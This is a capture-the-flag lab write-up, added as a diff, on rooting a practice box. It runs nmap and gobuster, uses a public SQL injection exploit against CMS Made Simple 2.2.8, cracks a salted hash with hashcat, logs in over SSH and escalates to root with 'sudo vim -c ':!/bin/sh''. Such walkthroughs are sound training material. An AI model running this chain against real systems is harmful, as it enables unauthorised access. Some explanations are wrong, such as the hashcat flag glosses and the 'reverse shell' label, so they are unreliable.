@@ -1,0 +1,80 @@
+# EasyCTF
+
+IP: 10.10.75.77
+
+# Ran nmap scan
+# nmap -sC -sV -oN nmap_scans/easyctf 10.10.75.77
+
+Open Ports: 21(FTP), 80(HTTP), 2222(OpenSSH)
+Ubuntu 2.8
+Apache 2.4.18
+Anonymous access is enabled on FTP
+
+# Checked the webpage
+
+Has default Apache2 Ubuntu page
+
+# Ran gobuster to brute force URL
+# gobuster dir -u http://10.10.75.77 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+# gobuster [mode] -u [target ip] -w [wordlist]
+
+Found /simple
+Using CMS Made Simple version 2.2.8
+
+# Searched for cms made simple on exploit-db.com
+Found exploitations for later versions, meaning 2.2.8 is heavily outdated
+CVE-2019-9053: SQL Injection (sqli)
+Downloaded EDB-ID: 46635.py
+
+
+# ftp 10.10.75.77
+# ran ls and found pub directory
+# cd into pub
+# ran ls and found ForMitch.txt file
+# ran mget * to get the file and exited out of ftp
+
+# cat ForMitch.txt and found out that possible user 'mitch' has a weak password
+
+# Ran the script exploitation on the open directory we found using gobuster
+# python2 46635.py -u http://10.10.75/77/simple
+
+# Found salt for the password, username, email, password
+
+1dac0d92e9fa6bb2
+mitch
+admin@admin.com
+0c01f4468bd75d7a84c7eb73846e8d96
+
+# ran hashchat for password recovery
+# hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt.gz
+# -O: limits password length
+# -a 0: attack mode 0 is MD5 hash
+# -m: hashtype mode
+# password first then salt for password
+# used rockyou wordlist
+
+Found out password is secret
+
+# ssh mitch@10.10.75.77 -p 2222
+# put in username 'mitch' and password 'secret'
+# ran ls and found users.txt
+# cat users.txt and found flag
+
+G00d j0b, keep up!
+
+# ran ls /home to check for other users in the home directory
+
+sunbath
+
+# ran sudo -l to see what the user can run without a password and find a way to priveledge escalation using a reverse shell
+
+vim
+
+# Checked on GTFObins for vim, specifically sudo
+
+sudo vim -c ':!/bin/sh'
+
+# ran the command above and spawned a reverse shell as root
+# cd into /root and then ran ls and found root.txt and then displayed the contents to find the flag
+
+W3ll d0n3. You made it!
